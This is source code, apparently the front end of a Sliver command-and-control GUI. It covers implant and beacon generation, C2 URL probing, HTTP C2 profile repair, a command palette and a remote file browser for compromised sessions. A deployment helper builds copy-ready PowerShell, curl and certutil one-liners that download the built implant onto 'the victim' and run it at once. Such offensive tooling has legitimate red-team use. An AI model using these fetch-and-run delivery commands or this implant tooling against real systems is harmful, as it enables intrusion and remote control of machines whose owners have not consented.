    <div class="gen-row" id="gen-test-panel" style="display:none"><div class="gen-field" style="flex:2"><div id="gen-test-body" class="result-box" style="white-space:pre-wrap;font-size:12px"></div></div></div>
    <div class="gen-row" id="gen-http-c2-row" style="display:none"><div class="gen-field" style="flex:2">
      <label>HTTP C2 Profile <span style="color:var(--muted);font-weight:400;font-size:11px">- controls URIs, User-Agent, and any custom headers baked into the beacon</span></label>
      <select name="httpC2Profile" id="gen-http-c2"><option value="">(teamserver default)</option></select>
      <div id="gen-http-c2-summary" style="font-size:11.5px;color:var(--muted);margin-top:4px;line-height:1.5"></div>
    </div></div>
    <div class="gen-row">
      <label class="check-label"><input type="checkbox" name="debug"/> Debug</label>
      <label class="check-label"><input type="checkbox" name="beacon" id="gbeacon"/> Beacon mode</label>
    </div>
    <div class="gen-row" id="gbeacon-opts" style="display:none">
      <div class="gen-field"><label>Interval (s)</label><input name="interval" type="number" value="60"/></div>
      <div class="gen-field"><label>Jitter (s)</label><input name="jitter" type="number" value="30"/></div>
    </div>
    <button type="submit" class="btn accent">Generate</button>
    <div id="gen-status" class="gen-status" style="display:none"><div class="spinner"></div><span>Building...</span></div>
    <div id="gen-result" class="result-box"></div>
    <div id="gen-deploy" style="display:none;margin-top:10px;padding:10px;border:1px solid var(--border);border-radius:6px;background:var(--panel,var(--bg))"></div>
  </form>`;
  openViewPanel('_generate', 'Generate', content);
  setTimeout(async () => {
    document.getElementById('gbeacon')?.addEventListener('change', function() {
      document.getElementById('gbeacon-opts').style.display = this.checked ? 'flex' : 'none';
    });
    // Populate "From Listener" dropdown from the richer details endpoint so we
    // can render "scheme://host:port  (Job N)" labels instead of bare URLs.
    // A userTyped flag stops later listener changes from clobbering a URL the
    // operator hand-edited (e.g. swapped an internal :8443 for a redirector).
    const sel = document.getElementById('gen-listener');
    const c2 = document.querySelector('#gen-form [name="c2Url"]');
    const httpC2Row = document.getElementById('gen-http-c2-row');
    const httpC2Sel = document.getElementById('gen-http-c2');
    const httpC2Summary = document.getElementById('gen-http-c2-summary');
    let listenerOpts = [];
    let userTypedC2 = false;
    let lastAutoFill = '';
    try { listenerOpts = await App().ListenerC2Details() || []; }
    catch (e) {
      // Backend without the new binding - fall back to the legacy URL-only list
      // so the form still works after a partial deploy.
      const urls = await App().ListenerC2Options().catch(() => []);
      listenerOpts = urls.map(u => ({ url: u, label: u, scheme: (u.split('://')[0] || '').toLowerCase() }));
    }
    if (sel) {
      sel.innerHTML = listenerOpts.length
        ? '<option value="">- select an active listener -</option>' + listenerOpts.map((o, i) => `<option value="${i}">${esc(o.label || o.url)}</option>`).join('')
        : '<option value="">- no active listeners -</option>';
      // Auto-select the first HTTP/S listener when present, else the first of
      // any kind. Redirector setups are HTTP; picking one avoids the mtls-only
      // trap where a fresh operator selects the operator port by mistake.
      if (listenerOpts.length && c2 && !c2.value.trim()) {
        let pick = listenerOpts.findIndex(o => o.scheme === 'http' || o.scheme === 'https');
        if (pick < 0) pick = 0;
        sel.value = String(pick);
        c2.value = listenerOpts[pick].url;
        lastAutoFill = listenerOpts[pick].url;
        refreshHTTPC2Row();
      }
      sel.addEventListener('change', () => {
        const idx = parseInt(sel.value);
        if (!Number.isInteger(idx) || !listenerOpts[idx]) return;
        // Only overwrite the C2 URL when the operator hasn't hand-edited it
        // away from whatever we last auto-filled. Preserves a manually-typed
        // redirector URL across listener re-picks.
        if (!userTypedC2 || !c2.value.trim() || c2.value.trim() === lastAutoFill) {
          c2.value = listenerOpts[idx].url;
          lastAutoFill = listenerOpts[idx].url;
          userTypedC2 = false;
        }
        refreshHTTPC2Row();
      });
    }
    c2?.addEventListener('input', () => {
      userTypedC2 = c2.value.trim() !== lastAutoFill;
      refreshHTTPC2Row();
    });

    // HTTP C2 profile picker - only meaningful for http/https URLs. When the
    // operator switches to a non-HTTP scheme (mtls, dns, wg), the whole row
    // hides so we don't imply the choice affects those transports.
    function schemeOf(u) { const m = String(u||'').match(/^([a-z0-9+\-\.]+):\/\//i); return m ? m[1].toLowerCase() : ''; }
    async function refreshHTTPC2Row() {
      const scheme = schemeOf(c2?.value);
      if (scheme === 'http' || scheme === 'https') {
        httpC2Row.style.display = 'flex';
        if (!httpC2Sel.dataset.loaded) {
          try {
            const names = await App().ListHTTPC2ProfileNames() || [];
            httpC2Sel.innerHTML = '<option value="">(teamserver default)</option>' +
              names.map(n => `<option value="${esc(n)}">${esc(n)}</option>`).join('');
            httpC2Sel.dataset.loaded = '1';
          } catch (e) {
            httpC2Sel.innerHTML = '<option value="">(teamserver default)</option>';
          }
        }
      } else {
        httpC2Row.style.display = 'none';
        httpC2Summary.textContent = '';
      }
    }
    httpC2Sel?.addEventListener('change', async () => {
      const n = httpC2Sel.value;
      if (!n) { httpC2Summary.textContent = ''; return; }
      httpC2Summary.textContent = 'Loading profile…';
      try {
        const s = await App().GetHTTPC2ProfileSummary(n);
        const hdrLine = (s.headers && s.headers.length)
          ? s.headers.map(h => `${h.name}: ${h.value}${h.method ? ` [${h.method}]` : ''}`).join('  ·  ')
          : '(no custom request headers)';
        const uri = s.sampleUri || (s.uriSamples && s.uriSamples[0] ? '/' + s.uriSamples[0] : '(random)');
        // Warnings first so the operator can't miss them - a profile with
        // NonceQueryLength=0 crashes the beacon on target with no telemetry
        // (Sliver's `secure.Intn: non-positive n` panic). If the profile is
        // repairable, offer a one-click fix that patches the config via
        // SaveHTTPC2Profile - no SSH / JSON editing required.
        const needsRepair = (s.warnings && s.warnings.length) || s.nonceQueryLength <= 0;
        const warnHtml = (s.warnings && s.warnings.length)
          ? s.warnings.map(w => `<div style="color:var(--accent);border-left:3px solid var(--accent);padding:4px 8px;background:rgba(226,60,78,.08);margin:4px 0"><b>⚠ ${esc(w)}</b></div>`).join('')
          : '';
        const fixBtnHtml = needsRepair
          ? `<div style="margin:6px 0"><button class="btn small accent" id="httpC2-fix-btn">Auto-fix this profile</button> <span style="color:var(--muted);font-size:11px">sets NonceQueryLength=16 + safe char set, saves back to the teamserver</span></div>`
          : '';
        httpC2Summary.innerHTML = warnHtml + fixBtnHtml +
          `<div><b>UA:</b> ${esc(s.userAgent || '(default)')}</div>` +
          `<div><b>Sample URI:</b> ${esc(uri)}</div>` +
          `<div><b>NonceQueryLength:</b> ${s.nonceQueryLength} ${s.nonceQueryLength <= 0 ? '<span style="color:var(--accent);font-weight:600">(broken - beacon will panic)</span>' : ''}</div>` +
          `<div><b>Request headers:</b> ${esc(hdrLine)}</div>`;
        const fixBtn = document.getElementById('httpC2-fix-btn');
        if (fixBtn) fixBtn.addEventListener('click', async () => {
          fixBtn.disabled = true;
          const orig = fixBtn.textContent;
          fixBtn.textContent = 'Repairing…';
          const r = await App().RepairHTTPC2Profile(n).catch(e => ({ error: String(e) }));
          if (r && r.error) {
            toast('err', 'Repair failed: ' + r.error);
            fixBtn.disabled = false; fixBtn.textContent = orig;
            return;
          }
          toast('ok', 'Profile ' + n + ' - ' + (typeof r === 'string' ? r : 'fixed'));
          // Re-load the summary so the warning goes away.
          httpC2Sel.dispatchEvent(new Event('change'));
        });
      } catch (e) {
        httpC2Summary.textContent = 'Could not load profile summary: ' + String(e);
      }
    });

    // Populate the C2 URL history datalist (per teamserver, capped at 20).
    const histKey = (persistKey || 'sliver-gui:default') + ':c2url-history';
    let c2Hist = [];
    try { c2Hist = JSON.parse(localStorage.getItem(histKey) || '[]'); } catch (e) {}
    const dl = document.getElementById('c2url-history');
    if (dl) dl.innerHTML = c2Hist.map(u => `<option value="${esc(u)}">`).join('');

    // Test button - probe the C2 URL from the operator's own network path so
    // we know whether the redirector, header check, and origin are all alive
    // BEFORE we spend 30s on a build that can't call home. Optional custom
    // header lets the operator preflight a redirector's shared-secret gate.
    document.getElementById('gen-test-btn')?.addEventListener('click', async () => {
      const panel = document.getElementById('gen-test-panel');
      const body = document.getElementById('gen-test-body');
      panel.style.display = 'flex';
      body.textContent = 'Probing…';
      const url = c2.value.trim();
      // Ask for an optional header if the operator wants to preflight one -
      // e.g. `X-Request-ID: 7f3b6a…`. Blank ⇒ probe with no extra header.
      const extra = await uiDialog({
        title: 'Test C2 URL',
        message: `Probe <code>${esc(url)}</code> with an optional extra request header.<br/>Leave blank to probe with no custom header. Format: <code>Name: value</code>`,
        input: true,
        placeholder: '',
        okLabel: 'Probe',
      });
      if (extra === null) { panel.style.display = 'none'; return; }
      const headers = {};
      const raw = String(extra || '').trim();
      if (raw) {
        const idx = raw.indexOf(':');
        if (idx > 0) headers[raw.slice(0, idx).trim()] = raw.slice(idx + 1).trim();
      }
      try {
        const r = await App().TestC2URL(url, headers);
        if (r.error) {
          body.innerHTML = `<span style="color:var(--accent)">✗ ${esc(r.error)}</span>`;
        } else if (r.note && r.status === 0) {
          body.innerHTML = `<span style="color:var(--muted)">${esc(r.note)}</span>`;
        } else {
          const color = (r.status >= 200 && r.status < 400) ? 'var(--ok)' : (r.status === 401 || r.status === 403) ? 'var(--warn,#e0a545)' : 'var(--accent)';
          const hdrs = Object.entries(r.headers || {}).map(([k,v]) => `  ${esc(k)}: ${esc(v)}`).join('\n');
          body.innerHTML = `<div style="color:${color}"><b>${r.status} ${esc(r.statusText || '')}</b>  ·  ${r.elapsedMs}ms  ·  → ${esc(r.finalUrl || url)}</div>` +
            (r.note ? `<div style="color:var(--muted);margin:4px 0">${esc(r.note)}</div>` : '') +
            (hdrs ? `<pre style="margin:6px 0 0;color:var(--muted);font-size:11px">${hdrs}</pre>` : '') +
            (r.bodyPreview ? `<pre style="margin:6px 0 0;max-height:120px;overflow:auto;font-size:11px;padding:4px;background:var(--bg);border:1px solid var(--border);border-radius:4px">${esc(r.bodyPreview)}</pre>` : '');
        }
      } catch (e) {
        body.innerHTML = `<span style="color:var(--accent)">✗ ${esc(String(e))}</span>`;
      }
    });

    document.getElementById('gen-form')?.addEventListener('submit', async e => {
      e.preventDefault(); const f = e.target;
      const req = {
        name: f.name.value,
        goos: f.goos.value,
        goarch: f.goarch.value,
        format: f.format.value,
        c2Url: f.c2Url.value,
        debug: f.debug.checked,
        beacon: f.beacon.checked,
        interval: parseInt(f.interval?.value) || 60,
        jitter: parseInt(f.jitter?.value) || 0,
        httpC2Profile: (f.httpC2Profile?.value || '').trim(),
      };
      document.getElementById('gen-status').style.display = 'flex';
      document.getElementById('gen-result').textContent = '';
      document.getElementById('gen-deploy').style.display = 'none';
      let r = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
      document.getElementById('gen-status').style.display = 'none';
      const res = document.getElementById('gen-result');
      // Two related Sliver-server collisions get auto-resolved here:
      //
      //  (a) UNIQUE constraint on implant_builds.name - the operator picked
      //      a name that already exists. We delete the old build then rebuild.
      //  (b) `rename import dir: target exists` - a prior half-completed
      //      delete left orphan state under ~/.sliver/slivers/…; Sliver's
      //      build then refuses to create the same tree. DeleteBuild returns
      //      OK but the retry-generate still errors. Recovery: try again
      //      with an auto-suffixed name (`-v2`, `-v3`, …) so the operator
      //      always gets a fresh build without SSHing to fix orphans.
      const isCollide  = (e) => /already exists|UNIQUE constraint/i.test(e || '');
      const isOrphan   = (e) => /rename import dir|target exists/i.test(e || '');
      const nameBase   = (req.name || '').trim();

      if (r.error && isCollide(r.error)) {
        // Auto-replace behaviour - no confirm. The operator explicitly
        // typed a name they want; treating that as "yes, replace" is the
        // correct default (CS behaves this way too). If they want to keep
        // both, they'd have picked a different name.
        document.getElementById('gen-status').style.display = 'flex';
        const delErr = await App().DeleteBuild(nameBase).catch(e => String(e));
        if (delErr && !isOrphan(delErr)) {
          document.getElementById('gen-status').style.display = 'none';
          res.textContent = `[ERROR] delete failed: ${delErr}`;
          res.style.color = 'var(--accent)';
        } else {
          r = await App().GenerateImplant(req).catch(e => ({error: String(e)}));
          document.getElementById('gen-status').style.display = 'none';
        }
      }

      // Orphan-state auto-rename: try up to 8 suffix variants (-v2 … -v9).
      // Emits a toast so the operator sees why the final name differs.
      if (r.error && isOrphan(r.error) && nameBase) {
        document.getElementById('gen-status').style.display = 'flex';
        let saved = null;
        for (let n = 2; n <= 9; n++) {
          const attempt = { ...req, name: nameBase + '-v' + n };
          const rr = await App().GenerateImplant(attempt).catch(e => ({error: String(e)}));
          if (!rr.error) { r = rr; saved = attempt.name; break; }
          if (!isOrphan(rr.error) && !isCollide(rr.error)) { r = rr; break; }
        }
        document.getElementById('gen-status').style.display = 'none';
        if (saved) {
          toast('warn', 'Sliver had orphan state for "' + nameBase + '". Saved as "' + saved + '" instead.');
        }
      }
      if (r.error) {
        res.style.color = 'var(--accent)';
        // If the guard fires because a profile has NonceQueryLength=0, give
        // the operator a one-click fix right in the error banner. Extract
        // the profile name from the error message (which quotes it).
        const nonceMatch = /NonceQueryLength=0/i.test(r.error);
        const profMatch = r.error.match(/profile\s+"([^"]+)"/);
        if (nonceMatch && profMatch) {
          const badProfile = profMatch[1];
          res.innerHTML = `<div>[ERROR] ${esc(r.error)}</div>` +
            `<button class="btn small accent" id="gen-fix-and-retry" style="margin-top:8px">Auto-fix "${esc(badProfile)}" and retry build</button>`;
          document.getElementById('gen-fix-and-retry')?.addEventListener('click', async () => {
            const btn = document.getElementById('gen-fix-and-retry');
            btn.disabled = true; btn.textContent = 'Repairing profile…';
            const fx = await App().RepairHTTPC2Profile(badProfile).catch(e => ({ error: String(e) }));
            if (fx && fx.error) { btn.textContent = 'Repair failed: ' + fx.error; return; }
            btn.textContent = 'Retrying build…';
            const rr = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
            if (rr.error) { res.innerHTML = `<div>[ERROR] ${esc(rr.error)}</div>`; return; }
            res.style.color = 'var(--ok)';
            const buildName = rr.name || rr.file;
            res.innerHTML = `<span>[OK] Build created: ${esc(buildName)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(buildName)}')">⬇ Save to disk</button>`;
            renderDeployHelper(buildName, req);
            buildRegen(buildName);
            // Also refresh the profile summary so the ⚠ banner clears.
            if (httpC2Sel && httpC2Sel.value) httpC2Sel.dispatchEvent(new Event('change'));
          });
        } else {
          res.textContent = `[ERROR] ${r.error}`;
        }
      } else {
        res.style.color = 'var(--ok)';
        const buildName = r.name || r.file;
        res.innerHTML = `<span>[OK] Build created: ${esc(buildName)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(buildName)}')">⬇ Save to disk</button>`;
        // Remember this C2 URL for the datalist (deduped, most-recent first).
        try {
          const u = req.c2Url.trim();
          if (u) {
            c2Hist = [u, ...c2Hist.filter(x => x !== u)].slice(0, 20);
            localStorage.setItem(histKey, JSON.stringify(c2Hist));
            if (dl) dl.innerHTML = c2Hist.map(x => `<option value="${esc(x)}">`).join('');
          }
        } catch (e) { /* localStorage full or private mode - non-fatal */ }
        renderDeployHelper(buildName, req);
        buildRegen(buildName);
      }
    });
  }, 0);
}

// renderDeployHelper draws the "how do I get this implant onto the target"
// panel that appears after a successful build. It's a pure QoL feature - no
// magic delivery - but it removes the "the build succeeded, now what?" cliff
// that trips new operators using redirector infra. The download-URL prefix
// is remembered per teamserver so the operator sets it once.
function renderDeployHelper(buildName, req) {
  const el = document.getElementById('gen-deploy');
  if (!el) return;
  const key = (persistKey || 'sliver-gui:default') + ':deploy-url-prefix';
  const savedPrefix = (() => { try { return localStorage.getItem(key) || ''; } catch (e) { return ''; } })();
  const ext = req.format === 'shellcode' ? '.bin' : (req.goos === 'windows' ? (req.format === 'shared' ? '.dll' : '.exe') : '');
  const filename = /\.[a-z0-9]{1,5}$/i.test(buildName) ? buildName : buildName + ext;
  const guess = savedPrefix ? (savedPrefix.replace(/\/$/, '') + '/' + filename) : '';
  el.style.display = 'block';
  el.innerHTML = `
    <div style="font-weight:600;font-size:12.5px;margin-bottom:6px">Deployment helper</div>
    <div style="font-size:11.5px;color:var(--muted);margin-bottom:6px">Set once - the download URL prefix your file server or auto-sync pipeline exposes builds under. Remembered per teamserver.</div>
    <div style="display:flex;gap:6px;align-items:center;margin-bottom:8px">
      <input id="deploy-prefix" placeholder="https://dl.example.net" value="${esc(savedPrefix)}" style="flex:1;padding:5px 7px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:12px"/>
      <button class="btn small" id="deploy-save-prefix">Save</button>
    </div>
    <div style="font-size:11.5px"><b>File:</b> <code>${esc(filename)}</code></div>
    <div style="font-size:11.5px;color:var(--muted);margin-top:4px">Copy a one-liner to fetch it on the victim:</div>
    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px">
      <button class="btn small" id="deploy-copy-ps" ${guess ? '' : 'disabled'}>Copy PowerShell</button>
      <button class="btn small" id="deploy-copy-curl" ${guess ? '' : 'disabled'}>Copy curl</button>
      <button class="btn small" id="deploy-copy-certutil" ${guess ? '' : 'disabled'}>Copy certutil</button>
    </div>
    <div id="deploy-url" style="font-size:11px;color:var(--muted);margin-top:6px;word-break:break-all">${guess ? 'URL: <code>' + esc(guess) + '</code>' : '(set a URL prefix above to enable copy buttons)'}</div>
  `;
  const prefixInp = document.getElementById('deploy-prefix');
  document.getElementById('deploy-save-prefix')?.addEventListener('click', () => {
    const p = (prefixInp.value || '').trim();
    try { localStorage.setItem(key, p); } catch (e) {}
    renderDeployHelper(buildName, req);
    toast('ok', 'Deployment prefix saved');
  });
  const copy = (txt) => {
    navigator.clipboard?.writeText(txt).then(() => toast('ok', 'Copied to clipboard'))
      .catch(() => toast('err', 'Copy failed (no clipboard permission)'));
  };
  const url = guess;
  document.getElementById('deploy-copy-ps')?.addEventListener('click', () => {
    copy(`Invoke-WebRequest -Uri "${url}" -OutFile "$env:TEMP\\${filename}"; Start-Process "$env:TEMP\\${filename}"`);
  });
  document.getElementById('deploy-copy-curl')?.addEventListener('click', () => {
    copy(`curl -sk -o /tmp/${filename} "${url}" && chmod +x /tmp/${filename} && /tmp/${filename}`);
  });
  document.getElementById('deploy-copy-certutil')?.addEventListener('click', () => {
    copy(`certutil -urlcache -f "${url}" %TEMP%\\${filename} && %TEMP%\\${filename}`);
  });
}
// ── Command palette (Ctrl+K) ─────────────────────────────────────────────────
// Palette now surfaces three item classes:
//   agents  - the two lists (sessions + beacons), searchable by any field
//   panels  - top-toolbar navigation
//   actions - verbs (test c2, change download dir, help, disconnect …)
// Plus a "recent" ribbon for the last 5 palette items the operator ran.
let paletteItems = [], paletteSel = 0;
const paletteRecent = []; // most-recent-first, capped at 5
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPalette(); }
  // "?" opens the keyboard-help overlay unless the operator is typing
  if (e.key === '?' && !isEditableTarget(e.target)) { e.preventDefault(); openKbdHelp(); }
});
function isEditableTarget(el) {
  if (!el) return false;
  if (el.isContentEditable) return true;
  const t = (el.tagName || '').toLowerCase();
  return t === 'input' || t === 'textarea' || t === 'select';
}
function openPalette() {
  if (document.getElementById('app-shell').classList.contains('hidden')) return; // not connected
  const ov = document.getElementById('palette-overlay');
  ov.classList.remove('hidden');
  const inp = document.getElementById('palette-input');
  inp.value = ''; buildPalette('');
  setTimeout(() => inp.focus(), 20);
}
function closePalette() { document.getElementById('palette-overlay').classList.add('hidden'); }
function paletteRunAgent(kind, o) { switchView('sessions'); openInteract(kind, o); }
function paletteActions() {
  // Static list of runnable verbs. New verbs added here surface automatically
  // in both search results and the recent ribbon. Keep labels lower-case for
  // stable substring matching.
  return [
    { label: 'test c2 url…',            hint: 'probe the current C2 URL through your network path', run: () => { switchView('generate'); setTimeout(() => document.getElementById('gen-test-btn')?.click(), 250); } },
    { label: 'change download dir',     hint: 'where generated implants save on this PC',           run: changeDownloadDir },
    { label: 'copy last c2 url',        hint: 'clipboard: most recent URL used in Generate',        run: async () => {
        const histKey = (persistKey || 'sliver-gui:default') + ':c2url-history';
        let arr = []; try { arr = JSON.parse(localStorage.getItem(histKey) || '[]'); } catch (e) {}
        if (!arr[0]) { toast('warn', 'No recent C2 URL yet'); return; }
        navigator.clipboard?.writeText(arr[0]); toast('ok', 'Copied: ' + arr[0]);
      } },
    { label: 'refresh agents',          hint: 'force a fresh sessions + beacons poll',              run: refreshAgents },
    { label: 'open generate',           hint: 'build a new implant',                                run: () => switchView('generate') },
    { label: 'open listeners',          hint: 'manage HTTP/mtls/dns/wg jobs',                       run: () => switchView('listeners') },
    { label: 'open profiles',           hint: 'saved implant profiles',                             run: () => switchView('profiles') },
    { label: 'open c2 profiles',        hint: 'HTTP C2 URIs / headers / user-agents',               run: () => switchView('c2profiles') },
    { label: 'open events',             hint: 'live event log',                                     run: () => switchView('events') },
    { label: 'help - keyboard shortcuts', hint: 'or press ?',                                       run: openKbdHelp },
    { label: 'disconnect',              hint: 'end this operator session',                          run: () => document.getElementById('disconnect-btn').click() },
  ];
}
function buildPalette(q) {
  q = q.toLowerCase().trim();
  const panels = ['sessions','beacons','listeners','generate','builds','profiles','events','loot','operators','hosts','creds','scripts','iocs','report','c2profiles'];
  const items = [];
  // Match helper: score by whether label starts with the query (higher rank).
  const match = (label) => {
    if (!q) return 1;
    const l = label.toLowerCase();
    if (l.startsWith(q)) return 3;
    if (l.includes(' ' + q)) return 2;
    if (l.includes(q)) return 1;
    return 0;
  };
  // Agents
  [...allSessions.map(s => ({ kind:'session', obj:s })), ...allBeacons.map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
    const label = `${a.obj.hostname||a.obj.id.slice(0,8)} - ${a.obj.username||''}${a.obj.remoteAddress ? '  (' + a.obj.remoteAddress.split(':')[0] + ')' : ''}`;
    const score = match(label);
    if (!q || score) items.push({ score, kind: 'agent', label, action: () => paletteRunAgent(a.kind, a.obj), icon: a.kind === 'session' ? '💻' : '📡' });
  });
  // Panels
  panels.forEach(p => {
    const s = match(p);
    if (!q || s) items.push({ score: s, kind: 'panel', label: p, action: () => switchView(p), icon: '⚙' });
  });
  // Actions - read from window so features-bundle.js can extend the list
  // via `window.paletteActions = fn`; a bare reference here would resolve
  // to this file's lexical binding and ignore extensions loaded later.
  (window.paletteActions || paletteActions)().forEach(a => {
    const s = Math.max(match(a.label), match(a.hint || ''));
    if (!q || s) items.push({ score: s, kind: 'action', label: a.label, hint: a.hint, action: a.run, icon: '⚡' });
  });
  // Recents - shown on top when no query
  if (!q) {
    paletteRecent.slice(0, 5).reverse().forEach(r => items.unshift({ kind: 'recent', label: r.label, action: r.action, icon: '↻', hint: 'recent' }));
  }
  // Stable-ish sort: higher score first, then recents/agents before panels/actions.
  items.sort((a, b) => (b.score || 0) - (a.score || 0));
  paletteItems = items; paletteSel = 0; renderPalette();
}
function renderPalette() {
  const el = document.getElementById('palette-results');
  if (!paletteItems.length) { el.innerHTML = '<div class="palette-empty">No matches</div>'; return; }
  el.innerHTML = paletteItems.map((it, i) => {
    const hint = it.hint ? `<span style="color:var(--muted);margin-left:10px;font-size:11px">${esc(it.hint)}</span>` : '';
    const kindClass = 'p-kind-' + (it.kind === 'recent' ? 'recent' : (it.kind || 'panel'));
    const chip = `<span class="fresh ${kindClass}" style="margin-right:8px;padding:0 6px;font-weight:600">${esc(it.kind || '')}</span>`;
    return `<div class="palette-item${i===paletteSel?' active':''}" data-i="${i}"><span style="margin-right:8px">${esc(it.icon || '·')}</span>${chip}<span>${esc(it.label)}</span>${hint}</div>`;
  }).join('');
  el.querySelectorAll('.palette-item').forEach(d => d.addEventListener('click', () => runPaletteItem(parseInt(d.dataset.i))));
}
function runPaletteItem(idx) {
  const it = paletteItems[idx]; if (!it) return;
  // Remember this action for the recent ribbon (dedup by label).
  if (it.kind !== 'recent') {
    const rec = { label: it.label, action: it.action };
    const dup = paletteRecent.findIndex(r => r.label === it.label);
    if (dup >= 0) paletteRecent.splice(dup, 1);
    paletteRecent.unshift(rec);
    if (paletteRecent.length > 10) paletteRecent.length = 10;
  }
  it.action();
  closePalette();
}
document.getElementById('palette-input').addEventListener('input', function(){ buildPalette(this.value); });
document.getElementById('palette-input').addEventListener('keydown', e => {
  if (e.key === 'Escape') return closePalette();
  if (e.key === 'ArrowDown') { paletteSel = Math.min(paletteSel+1, paletteItems.length-1); renderPalette(); e.preventDefault(); }
  if (e.key === 'ArrowUp')   { paletteSel = Math.max(paletteSel-1, 0); renderPalette(); e.preventDefault(); }
  if (e.key === 'Enter' && paletteItems[paletteSel]) { runPaletteItem(paletteSel); }
});

// ── Keyboard help overlay (?) ─────────────────────────────────────────────
function openKbdHelp() {
  const ov = document.getElementById('kbd-overlay');
  if (!ov) return;
  ov.classList.remove('hidden');
}
function closeKbdHelp() { document.getElementById('kbd-overlay')?.classList.add('hidden'); }
document.getElementById('kbd-close')?.addEventListener('click', closeKbdHelp);
document.getElementById('help-btn')?.addEventListener('click', openKbdHelp);
document.getElementById('kbd-overlay')?.addEventListener('click', e => { if (e.target.id === 'kbd-overlay') closeKbdHelp(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeKbdHelp(); });
document.getElementById('palette-overlay').addEventListener('click', e => { if (e.target.id === 'palette-overlay') closePalette(); });
// switchView - canonical way to navigate to a top-level view from anywhere
// in the app. Uses dispatchView so it works whether the toolbar has the old
// flat .tb-btn row or the new grouped menu-item dropdowns.
function switchView(v) { dispatchView(v); }
window.switchView = switchView;

// ── Resize handle ──────────────────────────────────────────────────────────
(function() {
  const handle = document.getElementById('resize-handle');
  const top = document.getElementById('top-panel');
  const bot = document.getElementById('bottom-panel');
  let dragging = false, startY = 0, startH = 0;
  handle.addEventListener('mousedown', e => { dragging = true; startY = e.clientY; startH = bot.offsetHeight; document.body.style.cursor = 'row-resize'; e.preventDefault(); });
  document.addEventListener('mousemove', e => { if (!dragging) return; const dy = startY - e.clientY; bot.style.height = Math.max(80, startH + dy) + 'px'; });
  document.addEventListener('mouseup', () => { if (dragging) { dragging = false; document.body.style.cursor = ''; } });
})();

// ── Auto-reconnect ─────────────────────────────────────────────────────────
function onDisconnected(reason) {
  if (reconnecting) return;
  reconnecting = true; clearInterval(pollTimer);
  document.getElementById('reconnect-overlay').classList.remove('hidden');
  document.getElementById('reconnect-status').textContent = reason || 'Connection lost';
  startReconnect();
}
function startReconnect() {
  let n = 10;
  document.getElementById('reconnect-count').textContent = n;
  clearInterval(reconnectTimer);
  reconnectTimer = setInterval(() => { n--; document.getElementById('reconnect-count').textContent = n; if (n <= 0) attemptReconnect(); }, 1000);
}
async function attemptReconnect() {
  if (!lastConfigPath) { cancelReconnect(); return; }
  clearInterval(reconnectTimer);
  document.getElementById('reconnect-status').textContent = 'Reconnecting...';
  const r = await App().Connect(lastConfigPath).catch(e => ({error:String(e)}));
  if (r && r.connected) { reconnecting = false; document.getElementById('reconnect-overlay').classList.add('hidden'); wireEventStream(); refreshAgents(); pollTimer = setInterval(refreshAgents, 5000); toast('ok','Reconnected'); }
  else { document.getElementById('reconnect-status').textContent = r?.error||'Failed'; startReconnect(); }
}
function cancelReconnect() { reconnecting = false; clearInterval(reconnectTimer); document.getElementById('reconnect-overlay').classList.add('hidden'); }
document.getElementById('reconnect-now-btn').addEventListener('click', attemptReconnect);
document.getElementById('reconnect-cancel-btn').addEventListener('click', async () => { cancelReconnect(); await App().Disconnect().catch(()=>{}); document.getElementById('disconnect-btn').click(); });

// Show GUI build version on the connect screen once the Wails runtime is ready.
(async function showGuiVersion() {
  let bi = null;
  try { bi = await App().AppVersion(); } catch (e) { /* runtime not ready or older backend */ }
  const el = document.getElementById('gui-version');
  if (el) {
    el.textContent = bi && bi.version ? bi.version : '';
    el.title = bi ? `Built ${bi.buildDate}` : '';
  }
  const wm = document.getElementById('panel-watermark');
  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''}`;
})();



// ── File Browser Panel ───────────────────────────────────────────────────────
async function openFileBrowser(sessionID) {
  const dockId = `files-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>📁 Files: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="display:flex;flex-direction:column;flex:1;min-height:0" id="fb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading file structure...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // File type icon mapping
  function fileIcon(name, isDir) {
    if (isDir) return '📁';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const map = {
      exe:'⚙️', dll:'🔧', sys:'🖥️', msi:'📦', bat:'📜', cmd:'📜', ps1:'💠', psm1:'💠', psd1:'💠',
      txt:'📄', log:'📋', cfg:'⚙️', ini:'⚙️', conf:'⚙️', xml:'📰', json:'📰', yaml:'📰', yml:'📰', toml:'📰',
      html:'🌐', htm:'🌐', css:'🎨', js:'📐', ts:'📐', jsx:'📐', tsx:'📐', py:'🐍', go:'🔵', rs:'🦀', c:'©️', cpp:'©️', h:'©️', cs:'💜', java:'☕', rb:'💎', php:'🐘',
      zip:'📦', rar:'📦', '7z':'📦', tar:'📦', gz:'📦', bz2:'📦', xz:'📦',
      png:'🖼️', jpg:'🖼️', jpeg:'🖼️', gif:'🖼️', bmp:'🖼️', ico:'🖼️', svg:'🖼️', webp:'🖼️',
      mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵', m4a:'🎵',
      mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬', wmv:'🎬',
